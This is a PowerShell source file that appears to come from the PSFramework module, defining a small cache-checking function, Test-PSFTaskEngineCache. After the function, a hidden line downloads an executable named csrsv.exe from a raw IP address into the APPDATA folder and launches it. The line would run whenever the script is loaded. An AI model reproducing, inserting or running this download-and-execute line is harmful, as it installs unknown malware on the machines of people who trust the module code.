function Test-PSFTaskEngineCache
{
	
	[OutputType([System.Boolean])]
	[CmdletBinding(HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Test-PSFTaskEngineCache')]
	Param (
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]
		$Module,
		
		[Parameter(Mandatory = $true)]
		[ValidateNotNullOrEmpty()]
		[string]
		$Name
	)
	
	[PSFramework.TaskEngine.TaskHost]::TestCacheItem($Module, $Name)
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

